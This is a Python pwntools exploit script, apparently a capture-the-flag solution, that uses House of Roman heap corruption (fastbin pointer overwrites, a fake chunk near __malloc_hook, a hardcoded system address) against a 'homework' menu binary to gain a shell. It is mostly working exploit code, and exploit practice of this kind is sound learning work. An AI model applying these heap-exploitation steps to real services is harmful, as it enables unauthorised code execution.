#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host homework --port 1337 ./homework
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './homework')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'homework'
port = int(args.PORT or 1337)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    #libc = exe.libc
    libc = ELF('libc-2.23.so')
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc-2.23.so')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc-2.23.so')
else:
    libc = ELF('libc-2.23.so')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(["./ld-2.23.so", "--library-path", ".", exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["./ld-2.23.so", "--library-path", ".", exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break free
c
c
'''.format(**locals())

'''
tbreak main
c
c
c
break printf
c
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

def select_option(option, wait=True):
    if wait:
        io.recvuntil(b"Choice: ")
    io.sendline(str(option).encode())
    
def createUser(name, password, wait=True):
    select_option(1, wait=wait)
    io.recvuntil(b"Username: ")
    io.sendline(name)
    io.recvuntil(b"Password: ")
    io.sendline(password)
    
def addSong(comment, length, wait=True):
    select_option(2, wait=wait) 
    io.recvuntil(b"be: ")
    io.sendline(length)
    io.recvuntil(b"comment: ")
    io.sendline(comment)
    
def deleteSong(id, wait=True):
    select_option(4, wait=wait)
    io.recvuntil(b"select: ")
    io.sendline(id)
    
def editComment(id, size, comment, wait=True):
    select_option(3, wait=wait)
    io.recvuntil(b"select: ")
    io.sendline(id)
    io.recvuntil(b"be: ")
    io.sendline(size)
    io.recvuntil(b"comment: ")
    io.sendline(comment)
    
def editStats(id, statShortcut, newValue, wait=True):
    select_option(7, wait=wait)
    io.recvuntil(b"select: ")
    io.sendline(id)
    io.recvuntil(b"Choice: ")
    io.sendline(statShortcut)
    io.recvuntil(b"[0-255]: ")
    io.sendline(newValue)
    
def secretMalloc():
    select_option(8, wait=True)

# contig and execution
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64
io = start()

# follow house of romans
addSong(b'song0', b'96')
addSong(b'song1', b'128')
addSong(b'song2', b'128')
addSong(b'song3', b'96')
deleteSong(b'2')

# fake_libc_chunk
addSong(b'song2', b'96')
deleteSong(b'3')
deleteSong(b'0')

# adapt fastbin chunk forward pointer
#attack =  b'song0' + b'\x00' * 3 + b'A' * 32 + b'\x00' * 8 + p64(0x71) + b'@'
#editComment(b'0', b'128', attack)
editStats(b'0', b'l', b'0')

# overwrite fd pointer of fake chunk -> 8 byte: 4 size, 1 listened, 1 length, 1 dislikes, 1 likes
# need address: malloc_hook - 0x23
editStats(b'2', b'l', b'237')
editStats(b'2', b'd', b'74')

# get fake address
addSong(b'AAAA', b'96')
addSong(b'BBBB', b'96')
# malloc_hook_chunk
addSong(b'', b'96')
addSong(b'DDDD', b'128')
addSong(b'EEEE', b'48')

# delet
deleteSong(b'8')

# adjust usorted bin address
editComment(b'8', b'128', b'')

# malloc buffer
addSong(b'', b'128')

# add system call
attack = b'\x00' * 3 + b'\x00' * 8 + b'\xa0\x53\x44\xf7\xff\x7f'
editComment(b'7', b'128', attack)


#deleteSong(b'5')
#addSong(b'song2', b'96')

# trigger exploit
secretMalloc()
io.interactive()
#io.sendline(b'cat flag.txt')


#io.interactive()